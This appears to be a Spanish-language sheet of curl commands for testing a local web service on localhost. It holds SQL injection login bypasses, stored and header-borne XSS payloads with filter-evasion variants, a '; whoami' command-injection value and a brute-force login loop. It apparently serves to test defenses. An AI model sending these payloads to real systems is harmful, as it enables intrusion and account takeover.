## 🟦 1. Fuerza Bruta / SQL Injection

```bash
curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin", "password":"pass"}'

curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\" OR \"1\"=\"1", "password":"pass"}'

curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"\' OR 1=1 --", "password":"any"}'
````

---

## 🟨 2. XSS Persistente

```bash
curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(\"xss\")</script>"}'

curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<img src=x onerror=alert(1)>"}'

curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<a href=\"javascript:alert(1)\">click</a>"}'
```

---

## 🟥 3. Inyección en Headers

```bash
curl -X POST http://localhost:8001/login \
  -H "User-Agent: <script>alert('x')</script>" \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "password":"test"}'

curl -X POST http://localhost:8001/login \
  -H "Referer: javascript:alert('xss')" \
  -H "Content-Type: application/json" \
  -d '{"username":"test", "password":"test"}'
```

---

## 🟪 4. Bypass con variantes evasivas

```bash
curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<sCript >alert(String.fromCharCode(88,83,83))</sCript>"}'

curl -X POST http://localhost:8001/comment \
  -H "Content-Type: application/json" \
  -d '{"comment":"<IMG SRC=\"javascript:alert(\'XSS\')\">"}'

curl -X POST http://localhost:8001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin\'/**/OR/**/1=1--", "password":"x"}'
```

---

## 🛠 Command Injection (simulación)

```bash
curl -X POST http://localhost:8001/execute \
  -H "Content-Type: application/json" \
  -d '{"command":"; whoami"}'
```

---

## 🟫 Ataque por tasa / fuerza bruta masiva

```bash
for i in {1..100}; do
  curl -s -X POST http://localhost:8001/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin", "password":"'"$i"'"}' > /dev/null
done
```

---

## 🟨 BONUS: XSS por query string

```bash
curl "http://localhost:8001/login?user=<script>alert(1)</script>"
```

---

## 🟩 Endpoints administrativos y de estado

```bash
curl http://localhost:8001/
curl http://localhost:8003/
```
